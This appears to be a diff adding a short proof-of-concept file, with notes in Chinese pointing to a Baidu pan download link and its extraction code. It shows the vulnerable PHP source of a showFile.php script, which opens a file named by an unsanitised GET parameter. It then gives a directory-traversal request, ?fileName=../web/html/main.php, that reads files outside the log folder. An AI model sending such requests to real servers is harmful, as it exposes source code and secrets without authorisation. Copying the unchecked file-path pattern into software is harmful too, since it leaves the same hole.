@@ -1,0 +1,19 @@
+该poc来自链接：https://pan.baidu.com/s/1wZoSo30EXiw9vMQBPtKFWg?pwd=zyxa 
+提取码：zyxa
+详情自行查看
+
+POC:
+<?php
+$file_name = $_GET['fileName'];
+$file_path = '../../../log/'.$file_name;
+$fp = fopen($file_path,"r");
+while($line = fgets($fp)){
+	$line = nl2br(htmlentities($line,ENT_COMPAT,"utf-8"));
+	echo '<spanstyle="fontsize:16px">'.$line.'</span>';
+}
+
+fclose($fp);
+
+?>
+
+/serverLog/showFile.php?fileName=../web/html/main.php
